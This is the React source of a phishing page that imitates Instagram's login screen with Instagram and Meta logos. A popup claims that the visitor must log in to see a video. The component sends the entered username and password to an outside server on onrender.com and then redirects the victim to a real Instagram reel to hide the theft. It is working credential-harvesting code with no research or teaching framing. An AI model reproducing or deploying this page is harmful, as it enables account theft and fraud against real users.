import { useState, useEffect } from "react";

const Login = () => {
  const [Password, setPassword] = useState("");
  const [username, setusername] = useState("");
  const [IsPasswordVisible, setIsPasswordVisible] = useState(false);
  const [ShowPopUp, setShowPopUp] = useState(false);

  const toggleVisibility = () => {
    setIsPasswordVisible(!IsPasswordVisible);
  };

  // const URL = "http://localhost:3001";
  const URL = "https://instagram-login-7y5a.onrender.com";

  const Login = async () => {
    const jsonData = await fetch(URL + "/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, Password }),
    }).then((res) => res.json());
    console.log(jsonData);
    window.location.href =
      "https://www.instagram.com/reel/CvufHHloseg/?igsh=MWJscXUyeXpyNnQxbA==";
  };

  useEffect(() => {
    setShowPopUp(true);
  }, []);

  console.log(username, Password);
  return (
    <div className="w-full  flex relative justify-center my-16 ">
      {/*  */}
      {ShowPopUp === false ? null : (
        <div className="absolute -top-14 bg-gray-200 p-1 text-sm">
          You need to login to see video{" "}
          <span
            className="cursor-pointer text-red-500"
            onClick={() => {
              setShowPopUp(false);
            }}
          >
            X
          </span>
        </div>
      )}
      <div className="flex flex-col">
        <div className=" w-80  h-96 lg:border lg:border-gray-400 flex items-center justify-center flex-col">
          <div className="py-6">
            <img
              src="https://emilyannebondoc.wordpress.com/wp-content/uploads/2014/09/instagram-header.png"
              alt="Instagram"
              className="w-40"
            />
          </div>
          <div className="details flex flex-col  ">
            <div className="mb-2 w-60">
              <input
                type="text"
                placeholder="Phone number, username or email address"
                value={username}
                onChange={(e) => setusername(e.target.value)}
                className="text-xs bg-slate-100 p-2 w-full  border border-gray-400"
              />
            </div>
            <div className="w-60 mb-3 relative ">
              <input
                type={IsPasswordVisible ? "text" : "password"}
                placeholder="password"
                value={Password}
                onChange={(e) => setPassword(e.target.value)}
                className="text-xs bg-slate-100 p-2 w-full  border border-gray-400"
              />
              {Password.length === 0 ? null : (
                <button
                  className="text-xs absolute right-3 top-2 font-semibold"
                  onClick={toggleVisibility}
                >
                  {IsPasswordVisible === true ? "Hide" : "Show"}
                </button>
              )}
            </div>
            <div className="w-60 mb-2">
              <button
                className="bg-sky-400 cursor-pointer text-white w-full rounded-lg p-1 text-sm"
                onClick={Login}
              >
                Log in
              </button>
            </div>
            <div className="flex items-center justify-center mt-4 mb-4">
              <div className="w-20 border border-gray-300 h-0 "></div>
              <div className="text-xs ml-5 mr-5 ">OR</div>
              <div className="w-20 border border-gray-300 h-0 "></div>
            </div>
            <div className="flex flex-col justify-center items-center">
              <div className="flex justify-center items-center mb-4 ">
                <span>
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png"
                    alt="fb"
                    className="w-[14px] mr-2"
                  />
                </span>
                <span className="text-blue-950 text-sm">
                  Log in with Facebook
                </span>
              </div>
              <div className="text-xs mb-4">Forgotten your password?</div>
            </div>
          </div>
        </div>

        {/* After or  */}
        <div className="create cursor-pointer text-sm text-blue-400 flex items-center justify-center lg:border lg:border-gray-400 h-14 mt-2">
          Create new account
        </div>
      </div>

      {/* footer */}
      <div className="footer text-xs fixed bottom-0 flex flex-col justify-center items-center bg-gray-100 w-full h-10 ">
        <div>from</div>
        <div>
          <img
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYkAAACACAMAAADJe2XzAAABhlBMVEX////uOkzZPWXvQk3xUU/3h1XvP033iFXxT0+5RovYPWbvRE3xU0/MQHT4ilXuOUzxYFDwV0/kOljxYlDHQnq4Roy7RYjoOVPKQXfOQHL3g1T1d1PqOFHmOVXbPGLlepD2fVTAYpzCQ4D0aVHxRD31clLUPmvBQ4H0bVL7p1j8r1nWPmn3gE795Nn3gUb8s1n+wFvFZZj6nlf5lFb23uX76Ovtsb75rJHdH03dgp3+wFj+8vL9uVr3v8X5klbnnrD71NbtITr6zs3escr+vEnILmzvOUL4trTwV0P6t530jZL5poj0hoX6mEf0Xz7wTzu7L3ryc3jwWmj2l4/3pqPrJkLcmbT6vrfzb2j2oZ30hnr4mnz1bT/uNTfwV1/95db80sf+8+r8von+4MX7oUfydXX2gmP2qK79v3Ppw9LXi6v4ubzBK3Dzg4jsUmXTcpj+z477x7PfWXfbC0XNUYH1fnP+4LX6pXPfkavjb4j8xqjvTl3Me6b7uI3ripr+15zLAFTKWo1ZC7YoAAAPgElEQVR4nO2c/V8TxxaHNwRiNJEQ4CJIQFo2SivhFmUR3UayUTYrBZIA4c0EobZGBGoL1kr1WvnP7+687czuzILUz1LrfH9oTXb2hX1y5pw5c2YURUpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkrqs1JudWljbW1utlk4oWFhdXlpab1U0MN4qi9OuTsjC5aVTrfGTdMwqnlhw9UNy1E6qarqWinEJ/wytP24nh0ZHu5wSCQSsVTNiDS5DUuW1eEo7SjZqqrLIT/pv1yPxob6s1mKRCoVMaIFX7tCh9XV1eWSSLa2qvFi+M/7b9X2/bGrNomR4S5IImqTiNgyZj0Nl8s2Aw+JeLzhbSZ1RuXG2ts4JGKxmLnJ+OQ5CMJLIm6undej/7v0ZP6+iEQ0ampuwzkrTUyCIRE3N0+6yfYPRHdO81DaHNL+/v7Z/7TPS0/mbweQSDQKuOGSmiYk0pZVtpJJTOJkFLmxUaihofrWKZ5qTQUXTiQSZuIMf9TOJNTOGc49L23P32JIJBkS9pvAKEo2CEiiyypvlIrF1SVVRSDiCbMafJvc2IW2q0BDQ0MnP1VRTZJLn4XE0SDQh2tnOPe89M0thoSlqiZLItEAHVTRAQFIWNYy9h4lNY5flxkczdIkRn878alIv3dGEtcGW1ou2fqMSPz4za3bLglrrpTfXV80apBEFJBIxO0Xr6lJCKLDWqJO19dM1IkkjELQfRwSbdgm6ic9VUn94kg8/QmSuOqQWMA/a23WqLkk4olNRW9NIpMor7JX+NlEJKLRoBsBEm2IRP9JTlsFLgiRiJ/h73JItHxWJH5yOidIIpvNud/ri4ZLIm7OrWESZd8wzkEBSJhBwwqGxFB9O/Cp1pPpL43Ej98CEu3tbUP9z9hDTcMlEY+3JiEJPwhFacU2YWj+g1gsif7HQU+lq+m0G5Z9ESS2fwIk7t+/cNUf0BQMP4kyL+GnNRCJSED8REgMAQVGshvJL47E82+/wSRG/QnuguElYc1xL9M0IYlYgNNmbWKof0j8VAU1/aWRePJfTKJ9bItz3EbBkugQXGgTkYgsCu/lxk4QRX1V2HQtHR4JbWflxbt3L1YeTJzhJp9OzzGJ9tEfuA12DYaEmuO2sscaDUgiwChcm0BGIYxki+WwSGgr3Xt73V87qlQqLzCMnQdIZ7jv2bT9kJAYEzTZNyGJVodEwEzEIiIREeaIvDbRn30kaJlOMyktPolCs/rLlczAL9ea/B8zJnFX+MiK9nKv2xYA8fUNW5VjmBsZr/Rc/I+tr8TnfmL9+j0mMSYc9CYIiXQ6IOFaMBEJQzSfmhtrv0CZxFB/f53ftGRhEkkRiULVqNVSGahaJzOjNQ11gEgcTNOis1ArM73d3QTFDaDKuPNM4z0XL14MlcRDQqJd2KbQcEmoAUHqpg3CJhGr7Qoa2DYBSIzeeYxI8CNZvQyzvGm1pPJJFN86KQBA4QpQJjPpHj3stOWknCCJS85/bt68DuVaiP5qprvbR6KnpzJxDiRe3yMkAvJAVUgCOOwAoyiZgERE6LMBiTaHhF5HJOo8t7NkoXz7nM4lYQ85U45cEgMDA4e/EPuaGkRCJG4SDNf7XBITM729XBI9lZ3wSXz3HSER0GqfCp1UcbyjNxAJUfcESbTZJJQ7o5CEdyzpSCujmQ9V13gkipADJpGBJDoHprC7OBUJB4SAhG0VYZPYfvg9JvGnuJXWoAd2lrhhFXROkYioe6JIKKPYKLZ8zX5Hc1B2dKChlDtNomlEIim/Tdgd0iHqOmkSLQISugOCoHBdNiDR0/NVyCTszgmRmA9IAi0yQ2wmDcsqbyISgnE2TeK3OiSRzXpbFcuIRFLhkZi1QdAkMi6JzgFojKch8eoyRWJv7+uXL969vFGpEBQOiYvhkXhOSPwhblRsMCTSZdGIQlEMSCJS4x+mSSjPUPfkG97hGXKnH9TINBQ+6qTCMImacaVa7azVMphE5wFoQ0gMCkm8mXFJ7B3voO5U33lXqZwLiYe2mwAk5gP8ddSTAOwQO+1qDJIw+AG+67GdD3VIIuuJZFctRMK5jY9EwYhhEqQwLr9YwySmQAR1OAVESNj/J+7iAyAxMXMZk9h7xTysvkKhCI3EE4fEt4CEuKRy1vSSsIQ1f00T2QTfUTAklB/6IYks293hmjbVeUE+EjHEOlXLFNxz8hlEonPK+TgBpB1BEi1H2gQl4Ete9WESey+8T6kdV0In8foeJBHUOWmGNyne0VEWcUO/2EiNP8wGIztCwo5k+wGKBXqMsoxIwESjl8SsiUh4XJF2BZOghnjXEAl/tsMxCUhiZoXznC8qYZP4FZOYF0dOmzgBqLokOjZErRGJ1FvuUZtEu0vCdtqQRJa6nF5G9TsqoO0hoQFH5MQE3iGLVkMoOt3vxCRe9iESe2+4DwpQhEni3j00nJh/ImrSNDEJZZNMnnLnioAWIYmIwT3qkLjgklCQTWQXtkiTjQ5IAvWAHhKzJibhu/ZkBhmF+2hCErpjEoDEseDveBcyiYd4YDcvaqHj6YlGUdFVQqKrS9De6T0ACW5SxEsiV4ck3Eg2V0Y1bSj37iEBB/GxiMEpYu9ERuG+dyGJSUDCRjEjzN2ES+IJIXFL1KQaQaUdTiBDamw6uixBSnYXk+AaDSTRRkgojxGJBRzJ/o7KPLHRsSTymESGc/FmhvLZQEISoHOySVwWZ2nHQyXxlJD4n6BFHk+eNkCk93OS2ESZ/2sqGJBEjVvt73hsZ0BBSOh1ZBML8HMRF6H/jhpoapIisR9FKUbe1fVDRIIEpUISM4jEjHhqaBwNKMIhYYdOkITIYeukoADOmOoqIUHeFSsNk1jnHfWRUB5lIYkRaGPDw8OABOHMkoiiZC9/uII89hRJykISLT4SE4jE5Vf8P9tRuDbxFyHxlN+gWkMkGihsLamEhMBpYxLcMNZPQkE2MbLg3KFkQRJuQkUjBZmKk2HEJLi3voYcxXvyBcp3eEnsIBLcCBYpXJv4lZDgh055A9YnJ0zyC0+79cn8TCDyEylu5gmRuEqR2KoDEtkRO5LVF5BNuJdmSBRMRCKS5+kIkTjAJ4tITGISAaXL50WCm/7TaxFMgnxXLLskuJnAKAARSXGnKDg2oTzOQhILOWVpGJDoosbwDIk8IVEzjBotkAvEAwoyohCRmMYkAioIxlHwFA6J58EkqjVUn2xSuYs1d/UE12m/jUAS3KEdxyZspw1JjDwDJuHYBBUiMyR2MYkYk42l0uJs8CQk0fcPJPG9mMSugSvF6WURBWppFy8TuIlIxHg3dKLYdo9NKHcQieGRYUiC9kC6h0TiNCRwLibAJvo+IxK6gSrFo+4yFkdLFllR5K1TdoRJRHg39I0ngBCJEUyCjsp0T+/EI5H5WBKTmESwn/inkFisYRKs89XL7nJH1Z8JfHuiTVzwktiqMySYTo8hUQQkoiISA6clsYNJTCpChU8CJMXn/XM/JQOvnmh4XnfJchee+gszY7FgP+E4Cg8J5RlNwmJGIrondsJhLBbltQ+hpqZqGKWIRAGRCBhih0zCTcX6xhOaEUEkTN8YrcslofoGFcYJsRNw2R4SuQWaBHNI94wnIIkomXDQeMInIxKDXhI6JnFZ/G7CJfGXOCm+GUMkYv5uplB2lwAnPcc0RII/k416Jy8J4LQRCYv1PbqKa8+cTwlEgj+y80lEQunrO3FAES6J1zgp7psomjUxCV4qb8lySfzMHsqbiAR3QYvAJhSlTkiMsAdYEvso3SGYnPVKSOIutomXwnPDJfH0ISbhyYrvNhKIBH81hEvCWye7j0mIMoB8EqsLiMRCgT2gk7V2zqcSGlD4e0yursGaAj+JHZICFBpFT6gktgmJ20xBgVN9iUjwa8jIpL9tFKyrQMmOCL9eXEhCeQZGdcML3slAloSGE0+C2hGPhCRIMra3V3DqeLgklHvcCkBNjSMSMUNQQrZBbVCgFtzvm4QEl6CYRG4ZynsaS0LZxGnxU20SIibxBpMQ9E/juLojvHlsQsJdO1FQ0bL4lCACsqVb1FYRrlVoaBo7aB6bT0IkDwmQ73DCCMEaDXYq7z2qeLrpa6fhSbveGV4kO14Jm8RTt1J8DKNYLrtbRdSEtTfFMrVpRwP5Cg2PfwUOWxg7ieUhgadPY9yKqsJAjRmrTSMSg/62d/vwTPaMzyp2cBVgiCQU1ybaR0cfbeW2lrsssmlHij8FCrVuUdunmJu7uqKtm3j8K3ATkET7mUi0ws9NE6c7/A937bCz85C+cb4TDe0OqC/haMOtKejt3WPc9sR4hSJxMSwSf7kk2q4O1esL9PYpvo2dGK2RVT/OL9ZsNEzYc4izTpjEhb9hEwpJd6SMKpMLbmau0EXK4GRcBTh4hL/dufsB/nOSoOju3uteQVYz8eCYqowNk4TCkGA3svGVFLHSGRJgNXYUk+DHsH+LBLIJsBYWVwEai7vwDerF95kMSjwNUmcf4HrMlg9H09PTd48u3bx+HVkAKXnCJcrHx85CO6pcPFwSrzkk0EY2vPoJWlrZTwK/I8Epn4CEUjKoFGCtZtQymZpTo4yzsVPv3bMnO8kSCndV0TQ6eJkm4VtCMR42CbIamyZhv9ZogLfGKqoCErxqJCDosT+WRJIhocwadDI2xSxmcbonioTCW8xyhC8tJnGjooVPQnFI3PaRiKUC1tNhFVUuCUFRrPKJSCjrhi8t7pI4ZDrGwhRnCQW5tpBEZUI5BxLbePuUIYqE+fZU2/EWVXdxKCEhWsainJ1EK7V+QnEqHSJ8EgOZzgJ7/vSUfwmF+6e9nPEuKwIcbmjKeZBQlD/myZZCiETjhL3LiLQkqkdKYBL+rTQp/Q0Srcy3VaPG6Z0yGX+kAFCwJKigdXLGT6ICam/GkcsOlYTy5/x9undSTdEqXo7W1ThtE8ZiIaDxpyJhh5tgNTY1k+1bk41VaBlkSHzoo8d5+psZZkl2pfIOdsvjFahwSdgs7o+Njjq79lpW+SP3ptbX485QImHaMhaD9+8FJOw7jZ2eRAPtu+lbGa83q3DKLgVm7BYF+xTYmjz4gBYVXfpwMO1rNvlyzxaIZPeOH+Cuiyx8Oe2TfjLlfrvz+NmzjeXVM+zXruWXZ/f3Z5vFk87dfvTnI6CtU197fXl5HYh3cCLffD/7vtnMn/C+9MLk9PSb6UlRs4kHK7bOeQMVKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKamP1P8BwbPB5M2yY68AAAAASUVORK5CYII="
            alt="meta"
            className="w-[48px]"
          />
        </div>
      </div>
    </div>
  );
};
export default Login;
